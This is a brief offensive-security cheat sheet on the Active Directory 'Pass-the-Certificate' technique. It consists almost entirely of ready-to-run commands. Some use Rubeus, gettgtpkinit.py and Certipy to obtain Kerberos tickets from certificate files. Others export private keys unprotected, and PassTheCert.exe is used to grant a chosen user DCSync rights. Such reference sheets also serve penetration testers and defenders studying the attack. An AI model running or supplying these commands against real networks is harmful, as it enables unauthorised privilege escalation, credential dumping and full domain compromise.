# Pass-the-Certificate

### Pass the Certificate in order to get a TGT, this technique is used in "UnPAC the Hash" and "Shadow Credential"

## Windows

#### 1) Information about a cert file

 - certutil -v -dump admin.pfx

#### 2) From a base64 PFX

 - Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:cert.pfx /password:"CERTIFICATE_PASS"

#### 3) Grant DCSync rights to a user

 - ./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate --target DOMAIN\USER --dcsync

#### 4) To restore

 - ./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate --target DOMAIN\USER --restore

## Linux

#### 1) Base64-encoded PFX certificate (string) (password can be set)

 - gettgtpkinit.py -pfx-base64 $(cat "PATH_TO_B64_PFX_CERT") "FQDN_DOMAIN/TARGET_SAMNAME"

#### 2) PEM certificate (file) + PEM private key (file)

 - gettgtpkinit.py -cert-pem "PATH_TO_PEM_CERT" -key-pem "PATH_TO_PEM_KEY" "FQDN_DOMAIN/TARGET_SAMNAME"

#### 3) PFX certificate (file) + password (string, optionnal)

 - gettgtpkinit.py -cert-pfx "PATH_TO_PFX_CERT" -pfx-pass "CERT_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME"

#### 4) Using Certipy

 - certipy auth -pfx "PATH_TO_PFX_CERT" -dc-ip 'dc-ip' -username 'user' -domain 'domain'

 - certipy cert -export -pfx "PATH_TO_PFX_CERT" -password "CERT_PASSWORD" -out "unprotected.txt"

